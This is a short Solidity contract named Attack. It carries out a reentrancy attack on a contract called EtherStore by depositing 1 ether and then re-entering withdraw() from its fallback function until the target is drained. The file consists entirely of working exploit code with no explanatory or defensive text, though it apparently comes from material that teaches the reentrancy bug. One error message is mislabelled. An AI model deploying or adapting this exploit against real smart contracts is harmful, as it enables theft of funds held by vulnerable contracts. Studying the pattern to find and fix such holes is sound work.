// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attack {
    address public etherStore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherStoreAddress) {
        etherStore = _etherStoreAddress;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            (bool ok,) = etherStore.call(abi.encodeWithSignature("withdraw()"));
            require(ok, "Failed to withdraw Ether from EtherStore");
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        (bool ok,) = etherStore.call{value: AMOUNT}(abi.encodeWithSignature("deposit()"));
        require(ok, "Failed to withdraw Ether from EtherStore");
        (bool ok2,) = etherStore.call(abi.encodeWithSignature("withdraw()"));
        require(ok2, "Failed to withdraw Ether from EtherStore");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
